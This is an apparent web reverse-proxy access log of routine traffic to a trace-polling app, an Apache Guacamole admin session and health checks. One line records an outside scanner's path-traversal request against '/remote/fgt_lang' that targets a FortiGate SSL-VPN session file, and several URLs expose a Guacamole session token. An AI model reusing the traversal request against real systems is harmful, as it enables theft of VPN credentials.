129.55.200.20 - - [14/Dec/2023:21:51:28 +0000] "GET /trace/ HTTP/2.0" 200 758 "-" "-" 3519 "livetrace@docker" "http://172.25.0.5:80" 4ms
129.55.200.20 - - [14/Dec/2023:21:51:28 +0000] "GET /trace/styles.css HTTP/2.0" 304 0 "-" "-" 3520 "livetrace@docker" "http://172.25.0.5:80" 0ms
129.55.200.20 - - [14/Dec/2023:21:51:28 +0000] "GET /trace/script.js HTTP/2.0" 304 0 "-" "-" 3521 "livetrace@docker" "http://172.25.0.5:80" 0ms
129.55.200.20 - - [14/Dec/2023:21:51:28 +0000] "GET /trace/start.php?id=wu0h3oj8n HTTP/2.0" 200 103 "-" "-" 3522 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:21:51:30 +0000] "GET /trace/poll.php?id=wu0h3oj8n HTTP/2.0" 200 83 "-" "-" 3523 "livetrace@docker" "http://172.25.0.5:80" 8ms
129.55.200.20 - - [14/Dec/2023:21:51:31 +0000] "GET /trace/poll.php?id=wu0h3oj8n HTTP/2.0" 200 83 "-" "-" 3524 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:51:32 +0000] "GET /trace/poll.php?id=wu0h3oj8n HTTP/2.0" 200 83 "-" "-" 3525 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:51:33 +0000] "GET /trace/poll.php?id=wu0h3oj8n HTTP/2.0" 200 83 "-" "-" 3526 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:21:51:34 +0000] "GET /trace/poll.php?id=wu0h3oj8n HTTP/2.0" 200 83 "-" "-" 3527 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:51:35 +0000] "GET /trace/poll.php?id=wu0h3oj8n HTTP/2.0" 200 83 "-" "-" 3528 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:51:36 +0000] "GET /trace/poll.php?id=wu0h3oj8n HTTP/2.0" 200 83 "-" "-" 3529 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:51:37 +0000] "GET /trace/poll.php?id=wu0h3oj8n HTTP/2.0" 200 83 "-" "-" 3530 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:51:38 +0000] "GET /trace/poll.php?id=wu0h3oj8n HTTP/2.0" 200 83 "-" "-" 3531 "livetrace@docker" "http://172.25.0.5:80" 1ms
167.71.120.76 - - [14/Dec/2023:21:51:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3532 "www@docker" "http://172.25.0.8:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:51:39 +0000] "GET /trace/poll.php?id=wu0h3oj8n HTTP/2.0" 200 83 "-" "-" 3533 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:51:40 +0000] "GET /trace/poll.php?id=wu0h3oj8n HTTP/2.0" 200 83 "-" "-" 3534 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:51:41 +0000] "GET /trace/poll.php?id=wu0h3oj8n HTTP/2.0" 200 83 "-" "-" 3535 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:51:42 +0000] "GET /trace/poll.php?id=wu0h3oj8n HTTP/2.0" 200 83 "-" "-" 3536 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:51:43 +0000] "GET /trace/poll.php?id=wu0h3oj8n HTTP/2.0" 200 83 "-" "-" 3537 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:21:51:44 +0000] "GET /trace/poll.php?id=wu0h3oj8n HTTP/2.0" 200 83 "-" "-" 3538 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:51:46 +0000] "GET /trace/poll.php?id=wu0h3oj8n HTTP/2.0" 200 83 "-" "-" 3539 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:51:47 +0000] "GET /trace/poll.php?id=wu0h3oj8n HTTP/2.0" 200 83 "-" "-" 3540 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:51:48 +0000] "GET /trace/poll.php?id=wu0h3oj8n HTTP/2.0" 200 245 "-" "-" 3541 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:51:59 +0000] "GET /trace/ HTTP/2.0" 200 758 "-" "-" 3542 "livetrace@docker" "http://172.25.0.5:80" 4ms
129.55.200.20 - - [14/Dec/2023:21:52:00 +0000] "GET /trace/start.php?id=1aa1w5to4 HTTP/2.0" 200 103 "-" "-" 3543 "livetrace@docker" "http://172.25.0.5:80" 3ms
129.55.200.20 - - [14/Dec/2023:21:52:02 +0000] "GET /trace/poll.php?id=1aa1w5to4 HTTP/2.0" 200 83 "-" "-" 3544 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:52:04 +0000] "GET /trace/poll.php?id=1aa1w5to4 HTTP/2.0" 200 83 "-" "-" 3545 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:52:05 +0000] "GET /trace/poll.php?id=1aa1w5to4 HTTP/2.0" 200 83 "-" "-" 3546 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:52:06 +0000] "GET /trace/poll.php?id=1aa1w5to4 HTTP/2.0" 200 83 "-" "-" 3547 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:52:08 +0000] "GET /trace/poll.php?id=1aa1w5to4 HTTP/2.0" 200 83 "-" "-" 3548 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:52:09 +0000] "GET /trace/poll.php?id=1aa1w5to4 HTTP/2.0" 200 83 "-" "-" 3549 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:21:52:10 +0000] "GET /trace/poll.php?id=1aa1w5to4 HTTP/2.0" 200 83 "-" "-" 3550 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:52:12 +0000] "GET /trace/poll.php?id=1aa1w5to4 HTTP/2.0" 200 83 "-" "-" 3551 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:52:13 +0000] "GET /trace/poll.php?id=1aa1w5to4 HTTP/2.0" 200 83 "-" "-" 3552 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:21:52:15 +0000] "GET /trace/poll.php?id=1aa1w5to4 HTTP/2.0" 200 83 "-" "-" 3553 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:21:52:17 +0000] "GET /trace/poll.php?id=1aa1w5to4 HTTP/2.0" 200 83 "-" "-" 3554 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:21:52:19 +0000] "GET /trace/poll.php?id=1aa1w5to4 HTTP/2.0" 200 245 "-" "-" 3555 "livetrace@docker" "http://172.25.0.5:80" 2ms
159.203.109.206 - - [14/Dec/2023:21:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3556 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:21:52:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3557 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:21:53:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3558 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:21:53:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3559 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:21:54:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3560 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:21:54:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3561 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:21:55:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3562 "www@docker" "http://172.25.0.8:80" 0ms
129.55.200.20 - - [14/Dec/2023:21:55:29 +0000] "GET /trace/ HTTP/2.0" 200 758 "-" "-" 3563 "livetrace@docker" "http://172.25.0.5:80" 5ms
129.55.200.20 - - [14/Dec/2023:21:55:29 +0000] "GET /trace/start.php?id=kvnsf3vbq HTTP/2.0" 200 103 "-" "-" 3564 "livetrace@docker" "http://172.25.0.5:80" 3ms
129.55.200.20 - - [14/Dec/2023:21:55:31 +0000] "GET /trace/poll.php?id=kvnsf3vbq HTTP/2.0" 200 83 "-" "-" 3565 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:21:55:32 +0000] "GET /trace/poll.php?id=kvnsf3vbq HTTP/2.0" 200 83 "-" "-" 3566 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:21:55:32 +0000] "GET /trace/poll.php?id=kvnsf3vbq HTTP/2.0" 200 83 "-" "-" 3567 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:55:33 +0000] "GET /trace/poll.php?id=kvnsf3vbq HTTP/2.0" 200 83 "-" "-" 3568 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:55:35 +0000] "GET /trace/poll.php?id=kvnsf3vbq HTTP/2.0" 200 83 "-" "-" 3569 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:55:36 +0000] "GET /trace/poll.php?id=kvnsf3vbq HTTP/2.0" 200 83 "-" "-" 3570 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:19:34 +0000] "GET /guacamole/websocket-tunnel?token=358C8346D924D3C0D4AB0C7E3F2DB99A7CF8A66D191427CD67F98595FC9768CF&GUAC_DATA_SOURCE=mysql&GUAC_ID=5&GUAC_TYPE=c&GUAC_WIDTH=2880&GUAC_HEIGHT=1666&GUAC_DPI=192&GUAC_TIMEZONE=America%2FNew_York&GUAC_AUDIO=audio%2FL8&GUAC_AUDIO=audio%2FL16&GUAC_IMAGE=image%2Fjpeg&GUAC_IMAGE=image%2Fpng&GUAC_IMAGE=image%2Fwebp HTTP/1.1" 0 0 "-" "-" 3433 "guacamole@docker" "http://172.25.0.9:8080" 2162282ms
129.55.200.20 - - [14/Dec/2023:21:55:37 +0000] "GET /trace/poll.php?id=kvnsf3vbq HTTP/2.0" 200 83 "-" "-" 3571 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:55:38 +0000] "GET /trace/poll.php?id=kvnsf3vbq HTTP/2.0" 200 83 "-" "-" 3572 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:21:08:26 +0000] "GET /guacamole/websocket-tunnel?token=358C8346D924D3C0D4AB0C7E3F2DB99A7CF8A66D191427CD67F98595FC9768CF&GUAC_DATA_SOURCE=mysql&GUAC_ID=9&GUAC_TYPE=c&GUAC_WIDTH=2880&GUAC_HEIGHT=1666&GUAC_DPI=192&GUAC_TIMEZONE=America%2FNew_York&GUAC_AUDIO=audio%2FL8&GUAC_AUDIO=audio%2FL16&GUAC_IMAGE=image%2Fjpeg&GUAC_IMAGE=image%2Fpng&GUAC_IMAGE=image%2Fwebp HTTP/1.1" 0 0 "-" "-" 3391 "guacamole@docker" "http://172.25.0.9:8080" 2831223ms
167.71.120.76 - - [14/Dec/2023:21:55:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3573 "www@docker" "http://172.25.0.8:80" 0ms
129.55.200.20 - - [14/Dec/2023:21:55:38 +0000] "GET /guacamole/ HTTP/2.0" 304 0 "-" "-" 3574 "guacamole@docker" "http://172.25.0.9:8080" 3ms
129.55.200.20 - - [14/Dec/2023:21:55:38 +0000] "GET /guacamole/app.js?b=20230726134908 HTTP/2.0" 304 0 "-" "-" 3576 "guacamole@docker" "http://172.25.0.9:8080" 1ms
129.55.200.20 - - [14/Dec/2023:21:55:38 +0000] "GET /guacamole/app.css?b=20230726134908 HTTP/2.0" 304 0 "-" "-" 3575 "guacamole@docker" "http://172.25.0.9:8080" 3ms
129.55.200.20 - - [14/Dec/2023:21:55:39 +0000] "GET /guacamole/api/patches HTTP/2.0" 200 340 "-" "-" 3578 "guacamole@docker" "http://172.25.0.9:8080" 5ms
129.55.200.20 - - [14/Dec/2023:21:55:39 +0000] "GET /guacamole/api/languages HTTP/2.0" 200 244 "-" "-" 3577 "guacamole@docker" "http://172.25.0.9:8080" 14ms
129.55.200.20 - - [14/Dec/2023:21:55:39 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 3579 "guacamole@docker" "http://172.25.0.9:8080" 5ms
129.55.200.20 - - [14/Dec/2023:21:55:39 +0000] "GET /trace/poll.php?id=kvnsf3vbq HTTP/2.0" 200 83 "-" "-" 3580 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:21:55:39 +0000] "GET /guacamole/translations/en.json HTTP/2.0" 200 49963 "-" "-" 3581 "guacamole@docker" "http://172.25.0.9:8080" 6ms
129.55.200.20 - - [14/Dec/2023:21:55:39 +0000] "GET /guacamole/api/session/data/mysql-shared/connectionGroups/ROOT/tree HTTP/2.0" 200 123 "-" "-" 3583 "guacamole@docker" "http://172.25.0.9:8080" 8ms
129.55.200.20 - - [14/Dec/2023:21:55:39 +0000] "GET /guacamole/api/session/data/mysql-shared/self/effectivePermissions HTTP/2.0" 200 228 "-" "-" 3585 "guacamole@docker" "http://172.25.0.9:8080" 8ms
129.55.200.20 - - [14/Dec/2023:21:55:39 +0000] "GET /guacamole/api/session/data/mysql/self/effectivePermissions HTTP/2.0" 200 685 "-" "-" 3584 "guacamole@docker" "http://172.25.0.9:8080" 70ms
129.55.200.20 - - [14/Dec/2023:21:55:39 +0000] "GET /guacamole/api/session/data/mysql/connectionGroups/ROOT/tree HTTP/2.0" 200 1632 "-" "-" 3582 "guacamole@docker" "http://172.25.0.9:8080" 86ms
129.55.200.20 - - [14/Dec/2023:21:55:39 +0000] "GET /guacamole/api/session/data/mysql-shared/activeConnections HTTP/2.0" 200 2 "-" "-" 3588 "guacamole@docker" "http://172.25.0.9:8080" 5ms
129.55.200.20 - - [14/Dec/2023:21:55:39 +0000] "GET /guacamole/api/session/data/mysql/users/jonathan HTTP/2.0" 200 409 "-" "-" 3586 "guacamole@docker" "http://172.25.0.9:8080" 69ms
129.55.200.20 - - [14/Dec/2023:21:55:39 +0000] "GET /guacamole/api/session/data/mysql/activeConnections HTTP/2.0" 200 2 "-" "-" 3587 "guacamole@docker" "http://172.25.0.9:8080" 49ms
129.55.200.20 - - [14/Dec/2023:21:55:40 +0000] "GET /trace/poll.php?id=kvnsf3vbq HTTP/2.0" 200 83 "-" "-" 3589 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:21:55:41 +0000] "GET /trace/poll.php?id=kvnsf3vbq HTTP/2.0" 200 83 "-" "-" 3590 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:55:42 +0000] "GET /trace/poll.php?id=kvnsf3vbq HTTP/2.0" 200 83 "-" "-" 3591 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:55:42 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 3592 "guacamole@docker" "http://172.25.0.9:8080" 5ms
129.55.200.20 - - [14/Dec/2023:21:55:42 +0000] "GET /guacamole/api/session/data/mysql/connections/9 HTTP/2.0" 200 300 "-" "-" 3593 "guacamole@docker" "http://172.25.0.9:8080" 16ms
129.55.200.20 - - [14/Dec/2023:21:55:43 +0000] "GET /trace/poll.php?id=kvnsf3vbq HTTP/2.0" 200 83 "-" "-" 3594 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:21:55:43 +0000] "GET /guacamole/api/session/tunnels/ede4f900-c57c-3534-9613-1c1b4c154cdd/protocol HTTP/2.0" 200 5172 "-" "-" 3596 "guacamole@docker" "http://172.25.0.9:8080" 5ms
129.55.200.20 - - [14/Dec/2023:21:55:43 +0000] "GET /guacamole/api/session/tunnels/ede4f900-c57c-3534-9613-1c1b4c154cdd/activeConnection/connection/sharingProfiles HTTP/2.0" 200 2 "-" "-" 3597 "guacamole@docker" "http://172.25.0.9:8080" 55ms
129.55.200.20 - - [14/Dec/2023:21:55:44 +0000] "GET /trace/poll.php?id=kvnsf3vbq HTTP/2.0" 200 83 "-" "-" 3598 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:55:45 +0000] "GET /trace/poll.php?id=kvnsf3vbq HTTP/2.0" 200 83 "-" "-" 3599 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:55:46 +0000] "GET /trace/poll.php?id=kvnsf3vbq HTTP/2.0" 200 83 "-" "-" 3600 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:55:47 +0000] "GET /trace/poll.php?id=kvnsf3vbq HTTP/2.0" 200 83 "-" "-" 3601 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:55:48 +0000] "GET /trace/poll.php?id=kvnsf3vbq HTTP/2.0" 200 83 "-" "-" 3602 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:21:55:49 +0000] "GET /trace/poll.php?id=kvnsf3vbq HTTP/2.0" 200 245 "-" "-" 3603 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:21:55:43 +0000] "GET /guacamole/websocket-tunnel?token=358C8346D924D3C0D4AB0C7E3F2DB99A7CF8A66D191427CD67F98595FC9768CF&GUAC_DATA_SOURCE=mysql&GUAC_ID=9&GUAC_TYPE=c&GUAC_WIDTH=2880&GUAC_HEIGHT=1666&GUAC_DPI=192&GUAC_TIMEZONE=America%2FNew_York&GUAC_AUDIO=audio%2FL8&GUAC_AUDIO=audio%2FL16&GUAC_IMAGE=image%2Fjpeg&GUAC_IMAGE=image%2Fpng&GUAC_IMAGE=image%2Fwebp HTTP/1.1" 0 0 "-" "-" 3595 "guacamole@docker" "http://172.25.0.9:8080" 15539ms
129.55.200.20 - - [14/Dec/2023:21:55:59 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 3604 "guacamole@docker" "http://172.25.0.9:8080" 4ms
129.55.200.20 - - [14/Dec/2023:21:56:01 +0000] "GET /guacamole/api/session/tunnels/2221d7f5-5d40-3b1d-b0be-46f73124945b/protocol HTTP/2.0" 200 5172 "-" "-" 3606 "guacamole@docker" "http://172.25.0.9:8080" 4ms
129.55.200.20 - - [14/Dec/2023:21:56:01 +0000] "GET /guacamole/api/session/tunnels/2221d7f5-5d40-3b1d-b0be-46f73124945b/activeConnection/connection/sharingProfiles HTTP/2.0" 200 2 "-" "-" 3607 "guacamole@docker" "http://172.25.0.9:8080" 86ms
129.55.200.20 - - [14/Dec/2023:21:56:19 +0000] "GET /guacamole/ HTTP/2.0" 304 0 "-" "-" 3608 "guacamole@docker" "http://172.25.0.9:8080" 2ms
129.55.200.20 - - [14/Dec/2023:21:56:19 +0000] "GET /guacamole/app.css?b=20230726134908 HTTP/2.0" 304 0 "-" "-" 3609 "guacamole@docker" "http://172.25.0.9:8080" 2ms
129.55.200.20 - - [14/Dec/2023:21:56:19 +0000] "GET /guacamole/app.js?b=20230726134908 HTTP/2.0" 304 0 "-" "-" 3610 "guacamole@docker" "http://172.25.0.9:8080" 1ms
129.55.200.20 - - [14/Dec/2023:21:56:20 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 3611 "guacamole@docker" "http://172.25.0.9:8080" 4ms
129.55.200.20 - - [14/Dec/2023:21:56:20 +0000] "GET /guacamole/api/patches HTTP/2.0" 200 340 "-" "-" 3613 "guacamole@docker" "http://172.25.0.9:8080" 3ms
129.55.200.20 - - [14/Dec/2023:21:56:20 +0000] "GET /guacamole/api/languages HTTP/2.0" 200 244 "-" "-" 3612 "guacamole@docker" "http://172.25.0.9:8080" 14ms
129.55.200.20 - - [14/Dec/2023:21:56:20 +0000] "GET /guacamole/api/session/data/mysql-shared/self/effectivePermissions HTTP/2.0" 200 228 "-" "-" 3617 "guacamole@docker" "http://172.25.0.9:8080" 5ms
129.55.200.20 - - [14/Dec/2023:21:56:20 +0000] "GET /guacamole/api/session/data/mysql-shared/connectionGroups/ROOT/tree HTTP/2.0" 200 123 "-" "-" 3615 "guacamole@docker" "http://172.25.0.9:8080" 6ms
129.55.200.20 - - [14/Dec/2023:21:56:20 +0000] "GET /guacamole/translations/en.json HTTP/2.0" 200 49963 "-" "-" 3618 "guacamole@docker" "http://172.25.0.9:8080" 3ms
129.55.200.20 - - [14/Dec/2023:21:56:20 +0000] "GET /guacamole/api/session/data/mysql/self/effectivePermissions HTTP/2.0" 200 741 "-" "-" 3616 "guacamole@docker" "http://172.25.0.9:8080" 41ms
129.55.200.20 - - [14/Dec/2023:21:56:20 +0000] "GET /guacamole/api/session/data/mysql/connectionGroups/ROOT/tree HTTP/2.0" 200 1632 "-" "-" 3614 "guacamole@docker" "http://172.25.0.9:8080" 43ms
129.55.200.20 - - [14/Dec/2023:21:56:20 +0000] "GET /guacamole/api/session/data/mysql/users/jonathan HTTP/2.0" 200 409 "-" "-" 3619 "guacamole@docker" "http://172.25.0.9:8080" 35ms
129.55.200.20 - - [14/Dec/2023:21:56:20 +0000] "GET /guacamole/api/session/data/mysql-shared/activeConnections HTTP/2.0" 200 2 "-" "-" 3621 "guacamole@docker" "http://172.25.0.9:8080" 9ms
129.55.200.20 - - [14/Dec/2023:21:56:20 +0000] "GET /guacamole/api/session/data/mysql/activeConnections HTTP/2.0" 200 214 "-" "-" 3620 "guacamole@docker" "http://172.25.0.9:8080" 41ms
129.55.200.20 - - [14/Dec/2023:21:56:23 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 3622 "guacamole@docker" "http://172.25.0.9:8080" 4ms
129.55.200.20 - - [14/Dec/2023:21:56:23 +0000] "GET /guacamole/api/session/data/mysql-shared/activeConnections HTTP/2.0" 200 2 "-" "-" 3623 "guacamole@docker" "http://172.25.0.9:8080" 6ms
129.55.200.20 - - [14/Dec/2023:21:56:23 +0000] "GET /guacamole/api/session/data/mysql/activeConnections HTTP/2.0" 200 214 "-" "-" 3624 "guacamole@docker" "http://172.25.0.9:8080" 53ms
94.232.43.74 - - [14/Dec/2023:21:56:23 +0000] "GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1" 404 19 "-" "-" 3625 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:21:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3626 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:21:56:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3627 "www@docker" "http://172.25.0.8:80" 0ms
129.55.200.20 - - [14/Dec/2023:21:56:52 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 3628 "guacamole@docker" "http://172.25.0.9:8080" 6ms
129.55.200.20 - - [14/Dec/2023:21:56:52 +0000] "GET /guacamole/api/session/data/mysql/history/connections?order=-startDate HTTP/2.0" 200 150914 "-" "-" 3629 "guacamole@docker" "http://172.25.0.9:8080" 90ms
143.110.222.166 - - [14/Dec/2023:21:56:55 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3630 "web-to-websecure@internal" "-" 0ms
129.55.200.20 - - [14/Dec/2023:21:57:06 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 3631 "guacamole@docker" "http://172.25.0.9:8080" 4ms
129.55.200.20 - - [14/Dec/2023:21:57:06 +0000] "GET /guacamole/api/session/data/mysql-shared/users HTTP/2.0" 200 76 "-" "-" 3633 "guacamole@docker" "http://172.25.0.9:8080" 5ms
129.55.200.20 - - [14/Dec/2023:21:57:06 +0000] "GET /guacamole/api/session/data/mysql/users HTTP/2.0" 200 1801 "-" "-" 3632 "guacamole@docker" "http://172.25.0.9:8080" 38ms
167.94.138.34 - - [14/Dec/2023:21:57:12 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3634 "web-to-websecure@internal" "-" 0ms
167.94.138.34 - - [14/Dec/2023:21:57:15 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3635 "web-to-websecure@internal" "-" 0ms
167.94.138.34 - - [14/Dec/2023:21:57:18 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3636 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:21:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3637 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:21:57:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3638 "www@docker" "http://172.25.0.8:80" 0ms
129.55.200.20 - - [14/Dec/2023:21:58:14 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 3639 "guacamole@docker" "http://172.25.0.9:8080" 7ms
129.55.200.20 - - [14/Dec/2023:21:58:14 +0000] "GET /guacamole/api/session/data/mysql/connectionGroups/ROOT/tree?permission=UPDATE&permission=DELETE HTTP/2.0" 200 1632 "-" "-" 3640 "guacamole@docker" "http://172.25.0.9:8080" 60ms
129.55.200.20 - - [14/Dec/2023:21:58:14 +0000] "GET /guacamole/api/session/data/mysql/activeConnections HTTP/2.0" 200 214 "-" "-" 3641 "guacamole@docker" "http://172.25.0.9:8080" 40ms
129.55.200.20 - - [14/Dec/2023:21:58:16 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 3642 "guacamole@docker" "http://172.25.0.9:8080" 4ms
129.55.200.20 - - [14/Dec/2023:21:58:16 +0000] "GET /guacamole/api/session/data/mysql/schema/protocols HTTP/2.0" 200 14101 "-" "-" 3646 "guacamole@docker" "http://172.25.0.9:8080" 23ms
129.55.200.20 - - [14/Dec/2023:21:58:16 +0000] "GET /guacamole/api/session/data/mysql/schema/connectionAttributes HTTP/2.0" 200 442 "-" "-" 3647 "guacamole@docker" "http://172.25.0.9:8080" 30ms
129.55.200.20 - - [14/Dec/2023:21:58:16 +0000] "GET /guacamole/api/session/data/mysql/connections/9 HTTP/2.0" 200 300 "-" "-" 3643 "guacamole@docker" "http://172.25.0.9:8080" 99ms
129.55.200.20 - - [14/Dec/2023:21:58:16 +0000] "GET /guacamole/api/session/data/mysql/connections/9/history HTTP/2.0" 200 58621 "-" "-" 3644 "guacamole@docker" "http://172.25.0.9:8080" 133ms
129.55.200.20 - - [14/Dec/2023:21:58:16 +0000] "GET /guacamole/api/session/data/mysql/connections/9/parameters HTTP/2.0" 200 81 "-" "-" 3645 "guacamole@docker" "http://172.25.0.9:8080" 136ms
129.55.200.20 - - [14/Dec/2023:21:58:16 +0000] "GET /guacamole/api/session/data/mysql/connectionGroups/ROOT/tree?permission=ADMINISTER HTTP/2.0" 200 1632 "-" "-" 3648 "guacamole@docker" "http://172.25.0.9:8080" 142ms
129.55.200.20 - - [14/Dec/2023:21:58:17 +0000] "GET /guacamole/api/session/data/mysql/activeConnections HTTP/2.0" 200 214 "-" "-" 3649 "guacamole@docker" "http://172.25.0.9:8080" 42ms
129.55.200.20 - - [14/Dec/2023:21:58:17 +0000] "GET /guacamole/images/action-icons/guac-show-pass.svg HTTP/2.0" 200 1152 "-" "-" 3650 "guacamole@docker" "http://172.25.0.9:8080" 3ms
159.203.109.206 - - [14/Dec/2023:21:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3651 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:21:58:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3652 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:21:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3653 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:21:59:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3654 "www@docker" "http://172.25.0.8:80" 1ms
71.6.134.231 - - [14/Dec/2023:22:00:12 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3655 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:22:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3656 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:22:00:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3657 "www@docker" "http://172.25.0.8:80" 0ms
129.55.200.20 - - [14/Dec/2023:22:00:44 +0000] "PUT /guacamole/api/session/data/mysql/connections/9 HTTP/2.0" 204 0 "-" "-" 3658 "guacamole@docker" "http://172.25.0.9:8080" 85ms
